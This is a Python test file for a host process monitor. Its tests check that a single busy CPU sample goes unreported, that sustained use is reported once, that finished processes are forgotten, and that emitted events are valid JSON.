def test_one_busy_sample_is_not_reported(paths, config, sleeper, monkeypatch):
    watcher = watcher_for(paths, config)
    watcher.scan_new()
    watcher.cpu_threshold = -1
    watcher.scan_resources()
    assert not paths.events.exists()


def test_sustained_use_is_reported_once(paths, config, sleeper):
    watcher = watcher_for(paths, config)
    watcher.scan_new()
    watcher.cpu_threshold = -1
    for _ in range(4):
        watcher.scan_resources()
    mine = [event for event in read_recent_jsonl(paths.events) if event["pid"] == sleeper.pid]
    assert len(mine) == 1
    assert "cpu" in mine[0]["meta"]["flags"]


def test_finished_processes_are_forgotten(paths, config):
    watcher = watcher_for(paths, config, [python_name()])
    process = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
    watcher.scan_new()
    process.kill()
    process.wait()
    deadline = time.time() + 5
    while psutil.pid_exists(process.pid) and time.time() < deadline:
        time.sleep(0.05)
    watcher.scan_new()
    assert process.pid not in watcher.known
    assert process.pid not in {key[0] for key in watcher.reported}


def test_events_are_valid_json(paths, config, sleeper):
    watcher_for(paths, config, [python_name()]).scan_new()
    for line in paths.events.read_text(encoding="utf-8").splitlines():
        assert json.loads(line)["src"] == "host_monitor"
